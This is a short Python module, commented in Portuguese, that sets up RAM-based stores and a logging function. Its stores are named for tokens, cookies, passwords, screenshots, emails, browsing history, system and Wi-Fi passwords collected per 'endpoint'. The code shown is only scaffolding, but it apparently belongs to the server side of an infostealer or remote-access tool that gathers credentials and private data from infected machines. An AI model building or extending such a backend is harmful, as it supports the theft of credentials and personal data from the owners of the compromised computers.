import datetime

# Memória do Sistema (RAM-based para evitar dependências de BD)
endpoints = {}
metrics_data = []
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
endpoint_screenshots = {}
endpoint_emails = {}
endpoint_history = {}
endpoint_system_passwords = {}
endpoint_wifi_passwords = {}
endpoint_system_info = {}
full_reports = {}
uploaded_files = {}
screenshot_requests = {}
system_logs = []

def add_log(level, source, message):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {
        'id': len(system_logs) + 1,
        'timestamp': timestamp,
        'level': level,
        'source': source,
        'message': message
    }
    system_logs.insert(0, log_entry)  # Mais recentes primeiro
    if len(system_logs) > 500:
        system_logs.pop() # Limite de 500 para evitar peso na RAM
    print(f"[{level}] [{source}] {message}")
